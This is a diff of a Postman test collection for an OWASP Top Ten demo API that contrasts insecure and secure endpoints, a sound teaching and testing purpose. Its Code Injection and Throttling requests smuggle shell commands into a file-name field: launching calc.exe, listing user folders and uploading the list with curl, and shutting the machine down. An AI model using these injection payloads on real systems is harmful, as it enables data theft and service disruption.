@@ -23,12 +23,12 @@
 							}
 						},
 						"url": {
-							"raw": "http://localhost:53200/auth/UserManagement/authenticateBasic",
+							"raw": "http://localhost:54200/auth/UserManagement/authenticateBasic",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"auth",
 								"UserManagement",
@@ -45,7 +45,7 @@
 						"header": [],
 						"body": {
 							"mode": "raw",
-							"raw": "{\r\n    \"username\": \"cnorris\",\r\n    \"password\": \"123456\"\r\n}",
+							"raw": "{\r\n    \"username\": \"fkahlo\",\r\n    \"password\": \"123456\"\r\n}",
 							"options": {
 								"raw": {
 									"language": "json"
@@ -53,12 +53,12 @@
 							}
 						},
 						"url": {
-							"raw": "http://localhost:53200/auth/UserManagement/authenticateJwt",
+							"raw": "http://localhost:54200/auth/UserManagement/authenticateJwt",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"auth",
 								"UserManagement",
@@ -76,7 +76,7 @@
 							"basic": [
 								{
 									"key": "username",
-									"value": "cnorris",
+									"value": "cnorris2",
 									"type": "string"
 								},
 								{
@@ -89,12 +89,12 @@
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "http://localhost:53200/auth/UserManagement/getBasic",
+							"raw": "http://localhost:54200/auth/UserManagement/getBasic",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"auth",
 								"UserManagement",
@@ -112,7 +112,7 @@
 							"bearer": [
 								{
 									"key": "token",
-									"value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjMiLCJuYmYiOjE1OTM2NDA2MDAsImV4cCI6MTU5NDI0NTQwMCwiaWF0IjoxNTkzNjQwNjAwfQ.Eana2LfDE1Tv0qW1y0_S66yllz5S_TVGJz_VVLk8JLA",
+									"value": "eyJhbGciOiJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGVuYyNyc2Etb2FlcCIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJraWQiOiIyRjZEMkIyQTlFN0U2OERFQUZBMDBFQzNCOEVFQTdGMEUzN0FCN0U1IiwidHlwIjoiSldUIn0.d_EG0yGH2b2Mi2kj2qYpzvl6wRA5vfKoLD4n2SwYqwuaDW-GqmiVwZ7SYjssodTJUCI5JsbIwNVRMpyevRRfeikkjQB3mUwApkhFNeP0x6vniuvTUEIhPWYdtLHB7kcTjudDvz-UEcBDqi9kRnZwUXSBVhGTRsuoxdoLIYk4TlscZyJsvmFDjVCgHmv3A6vLc5ac_SvL0DoRC2s9cTPsrEXKOj0RZRtLxtXGDbm9SxWKi4Ekwjf6pzUNpi-lB4dLj3dX_8565zxRNwFZVnvuqBOzLFu5Rh598qP9_nnF7XXNKlKx2hy-BjDGlFaiz9ac6QRURm2hr_GtYk-Qr3bx5w.kgW5mqJv9E9pX9HPzRYKyA.G_71E0wT71H3T-ap1UjdEp9sriYewPxPCgKl-PBB6mYBSQeyVEc6pflDoyJb9wN3471uCVBmUtk6Ex6y_ddq-3vPSKAWuzTOG8mjdTGobrBoc1dtKbU9-syQb7uir58ZGAIxAUO2pa-kuZvaCFPlaou4rkKxqhlADvHOO9BPe97TQQi8Ca3kkdj8H7VmkK5UzGdBPlqIo0zeoM6xwjSXBwg-It3A5vjzt2gSb04GXmAJraRAp770CSvhmnvGH6jC_w82FPjdC91PXTu9jb98HA.DBuCYH6rEUQhijiNAn6bcw",
 									"type": "string"
 								}
 							]
@@ -120,12 +120,12 @@
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "http://localhost:53200/auth/UserManagement/getBearer",
+							"raw": "http://localhost:54200/auth/UserManagement/getBearer",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"auth",
 								"UserManagement",
@@ -190,16 +190,11 @@
 					"name": "http://localhost:53200/bfl/SecAccount",
 					"request": {
 						"auth": {
-							"type": "basic",
-							"basic": [
+							"type": "bearer",
+							"bearer": [
 								{
-									"key": "username",
-									"value": "cnorris",
-									"type": "string"
-								},
-								{
-									"key": "password",
-									"value": "123456",
+									"key": "token",
+									"value": "eyJhbGciOiJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGVuYyNyc2Etb2FlcCIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJraWQiOiIyRjZEMkIyQTlFN0U2OERFQUZBMDBFQzNCOEVFQTdGMEUzN0FCN0U1IiwidHlwIjoiSldUIn0.Z5Z9TqB9WryZbsIfN9p-UyFOspXKrBsnbDXhaFoC_9m8Ix9ChVKXHGYspuVN_7y2p01Z11WYeAs4mCLTrPL_73bQ1HNjdha9LvZXKLifC_fXjHP_AbLahdZ3V83-HN5lc0cjKiUBQCTdMndqhr0tm5IMXnSW188-r6l6n-k5WmgWEcSRY5D5oJPHLYPyg_ulKtKaATHmQTGS6HcHZ2Ojnr3cf6nAJFet2XXDn0km0_sFw3erM46vSOoQtk6Q8E0pjLnCQwvty91NNTVubLh1TUiSweB-1_M1vnWOfZ0YdZJrSGptwYynwarFpL-dxtgDtc3YzGGOfDPU3E2GdaSYyA.tl0yHRUljbRGVkxBQhPEtw.B8a_kdA35V0X5AVy4UEtmIuQ2z29uBqWAAHBA3QqmgMuCGvY9IS2oY86Tg4GGLf9UDuripfhRScWBcfTDkZvQcr9T0Zr6uGs4vZiw33ze0lXHE51rLtIF-tywwRcaJvwpeNcRMPh4vDl31Msbfshi15rvYbW9YU_whbYAzZgBuT_vqVme1-fBfCiNJhDf3-JiskXXkfiML9LUV-bpOhhfmPpbH7MDUDJZZmSz-d6ruslFo-ZFjtWv6ektQDyMz4gdmZo7wMqqS1AsZsxcaTDGg.XNUp6e_v8ovInEJYutiXLQ",
 									"type": "string"
 								}
 							]
@@ -216,16 +211,16 @@
 							}
 						},
 						"url": {
-							"raw": "http://localhost:53200/bfl/SecAccount/3",
+							"raw": "http://localhost:54200/bfl/SecAccount/2",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"bfl",
 								"SecAccount",
-								"3"
+								"2"
 							]
 						}
 					},
@@ -270,7 +265,7 @@
 							}
 						},
 						"url": {
-							"raw": "http://localhost:53200/bol/InsAccount/GetBalance/3",
+							"raw": "http://localhost:53200/bol/InsAccount/GetBalance/1",
 							"protocol": "http",
 							"host": [
 								"localhost"
@@ -280,7 +275,7 @@
 								"bol",
 								"InsAccount",
 								"GetBalance",
-								"3"
+								"1"
 							]
 						}
 					},
@@ -297,7 +292,7 @@
 							"basic": [
 								{
 									"key": "username",
-									"value": "cnorris",
+									"value": "fkahlo",
 									"type": "string"
 								},
 								{
@@ -319,17 +314,17 @@
 							}
 						},
 						"url": {
-							"raw": "http://localhost:53200/bol/SecAccount/GetBalance/1",
+							"raw": "http://localhost:54200/bol/SecAccount/GetBalance/2",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"bol",
 								"SecAccount",
 								"GetBalance",
-								"1"
+								"2"
 							]
 						}
 					},
@@ -481,13 +476,13 @@
 			"name": "Code Injection",
 			"item": [
 				{
-					"name": "http://localhost:53200/bol/InsAccount/GetBalance/1",
+					"name": "Injection #1",
 					"request": {
 						"method": "PUT",
 						"header": [],
 						"body": {
 							"mode": "raw",
-							"raw": "{\r\n    \"originFile\": \"d:\\\\Temp\\\\owasp\\\\testfile.txt\",\r\n    \"destFile\": \"d:\\\\Temp\\\\owasp\\\\testfile2.txt&&dir c:\\\\Users > c:\\\\Temp\\\\users.txt && curl.exe -F uploadedFile=@c:\\\\Temp\\\\users.txt http://localhost:53200/mime/InsImageUploader\"\r\n}",
+							"raw": "{\r\n    \"originFile\": \"d:\\\\Downloads\\\\owasp\\\\testfile.txt\",\r\n    \"destFile\": \"d:\\\\Downloads\\\\owasp\\\\testfile2.txt&&calc.exe\"\r\n}",
 							"options": {
 								"raw": {
 									"language": "json"
@@ -495,12 +490,12 @@
 							}
 						},
 						"url": {
-							"raw": "http://localhost:53200/cij/InsAccount/UpdateBalances",
+							"raw": "http://localhost:54200/cij/InsAccount/UpdateBalances",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"cij",
 								"InsAccount",
@@ -511,7 +506,67 @@
 					"response": []
 				},
 				{
-					"name": "http://localhost:53200/bol/SecAccount/GetBalance/1",
+					"name": "Llamada normal (copia de archivo)",
+					"request": {
+						"method": "PUT",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"originFile\": \"d:\\\\Downloads\\\\owasp\\\\testfile.txt\",\r\n    \"destFile\": \"d:\\\\Downloads\\\\owasp\\\\testfile2.txt\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://localhost:54200/cij/InsAccount/UpdateBalances",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "54200",
+							"path": [
+								"cij",
+								"InsAccount",
+								"UpdateBalances"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Injection #2",
+					"request": {
+						"method": "PUT",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"originFile\": \"d:\\\\Downloads\\\\owasp\\\\testfile.txt\",\r\n    \"destFile\": \"d:\\\\Downloads\\\\owasp\\\\testfile2.txt&&dir c:\\\\Users > c:\\\\Temp\\\\users.txt && curl.exe -F uploadedFile=@c:\\\\Temp\\\\users.txt http://localhost:54200/mime/InsImageUploader\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://localhost:54200/cij/InsAccount/UpdateBalances",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "54200",
+							"path": [
+								"cij",
+								"InsAccount",
+								"UpdateBalances"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Llamada correcta",
 					"protocolProfileBehavior": {
 						"disabledSystemHeaders": {
 							"accept": true
@@ -536,12 +591,12 @@
 							}
 						},
 						"url": {
-							"raw": "http://localhost:53200/cij/SecAccount/UpdateBalances",
+							"raw": "http://localhost:54200/cij/SecAccount/UpdateBalances",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"cij",
 								"SecAccount",
@@ -561,29 +616,17 @@
 					"name": "http://localhost:53200/idor/InsAccount/GetBalanceFile",
 					"request": {
 						"auth": {
-							"type": "basic",
-							"basic": [
-								{
-									"key": "username",
-									"value": "cnorris",
-									"type": "string"
-								},
-								{
-									"key": "password",
-									"value": "123456",
-									"type": "string"
-								}
-							]
+							"type": "noauth"
 						},
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "http://localhost:53200/idor/InsAccount/GetBalanceFile/1",
+							"raw": "http://localhost:54200/idor/InsAccount/GetBalanceFile/1",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"idor",
 								"InsAccount",
@@ -615,17 +658,17 @@
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "http://localhost:53200/idor/InsAccount/GetBalanceFileAuth/1",
+							"raw": "http://localhost:54200/idor/InsAccount/GetBalanceFileAuth/3",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"idor",
 								"InsAccount",
 								"GetBalanceFileAuth",
-								"1"
+								"3"
 							]
 						}
 					},
@@ -652,17 +695,17 @@
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "http://localhost:53200/idor/InsAccount/GetBalanceFileScrambledName/1",
+							"raw": "http://localhost:54200/idor/InsAccount/GetBalanceFileScrambledName/3",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"idor",
 								"InsAccount",
 								"GetBalanceFileScrambledName",
-								"1"
+								"3"
 							]
 						}
 					},
@@ -701,12 +744,12 @@
 							}
 						},
 						"url": {
-							"raw": "http://localhost:53200/idor/SecAccount/GetBalanceFileBlob/1",
+							"raw": "http://localhost:54200/idor/SecAccount/GetBalanceFileBlob/1",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"idor",
 								"SecAccount",
@@ -749,15 +792,35 @@
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "http://localhost:54200/httpcodes/get200ok",
+							"raw": "http://localhost:53200/httpcodes/get200ok",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "54200",
+							"port": "53200",
 							"path": [
 								"httpcodes",
 								"get200ok"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://localhost:53200/httpcodes/get201Create",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:53200/httpcodes/get201Created",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "53200",
+							"path": [
+								"httpcodes",
+								"get201Created"
 							]
 						}
 					},
@@ -769,12 +832,12 @@
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "http://localhost:53200/httpcodes/get500ServerError",
+							"raw": "http://localhost:54200/httpcodes/get500ServerError",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"httpcodes",
 								"get500ServerError"
@@ -850,7 +913,7 @@
 			"name": "MimeTypeValidation",
 			"item": [
 				{
-					"name": "http://localhost:53200/mime/InsImageUploader",
+					"name": "http://localhost:53200/mime/InsImageUploader SIN VALIDACIONES",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -862,7 +925,10 @@
 									"type": "file",
 									"src": "/D:/Proyectos/owasp-topten-api/src/TestFiles/SeguInfo.png"
 								}
-							]
+							],
+							"options": {
+								"formdata": {}
+							}
 						},
 						"url": {
 							"raw": "http://localhost:53200/mime/InsImageUploader",
@@ -880,7 +946,7 @@
 					"response": []
 				},
 				{
-					"name": "http://localhost:53200/mime/SecImageUploader",
+					"name": "http://localhost:53200/mime/SecImageUploader VALIDA MTYPE",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -892,15 +958,18 @@
 									"type": "file",
 									"src": "/D:/Proyectos/owasp-topten-api/src/TestFiles/SeguInfo.jpg"
 								}
-							]
+							],
+							"options": {
+								"formdata": {}
+							}
 						},
 						"url": {
-							"raw": "http://localhost:53200/mime/SecImageUploader",
+							"raw": "http://localhost:54200/mime/SecImageUploader",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"mime",
 								"SecImageUploader"
@@ -910,7 +979,7 @@
 					"response": []
 				},
 				{
-					"name": "http://localhost:53200/mime/InsImageUploader/",
+					"name": "http://localhost:53200/mime/InsImageUploader SOLO VALIDACION EXTENSION",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -922,15 +991,18 @@
 									"type": "file",
 									"src": "/D:/Proyectos/owasp-topten-api/src/TestFiles/SeguInfo.jpg"
 								}
-							]
+							],
+							"options": {
+								"formdata": {}
+							}
 						},
 						"url": {
-							"raw": "http://localhost:53200/mime/InsImageUploader/CheckExtension",
+							"raw": "http://localhost:54200/mime/InsImageUploader/CheckExtension",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"mime",
 								"InsImageUploader",
@@ -947,7 +1019,7 @@
 			"name": "Throttling",
 			"item": [
 				{
-					"name": "http://localhost:53200/thr/InsAccount/GetBalance/1",
+					"name": "Sin Throttling Control",
 					"protocolProfileBehavior": {
 						"disableBodyPruning": true
 					},
@@ -981,13 +1053,19 @@
 					"response": []
 				},
 				{
-					"name": "http://localhost:53200/thr/SecAccount/GetBalance/1",
+					"name": "Con Throttling Control",
 					"protocolProfileBehavior": {
 						"disableBodyPruning": true
 					},
 					"request": {
 						"method": "GET",
-						"header": [],
+						"header": [
+							{
+								"key": "X-User-ID",
+								"value": "1",
+								"type": "text"
+							}
+						],
 						"body": {
 							"mode": "raw",
 							"raw": "{\r\n    \"originFile\": \"d:\\\\Temp\\\\testfile.txt\",\r\n    \"destFile\": \"d:\\\\Temp\\\\testfile2.txt*&&shutdown /s /t 36000\"\r\n}",
@@ -998,12 +1076,12 @@
 							}
 						},
 						"url": {
-							"raw": "http://localhost:53200/thr/SecAccount/GetBalance/1",
+							"raw": "http://localhost:54200/thr/SecAccount/GetBalance/1",
 							"protocol": "http",
 							"host": [
 								"localhost"
 							],
-							"port": "53200",
+							"port": "54200",
 							"path": [
 								"thr",
 								"SecAccount",
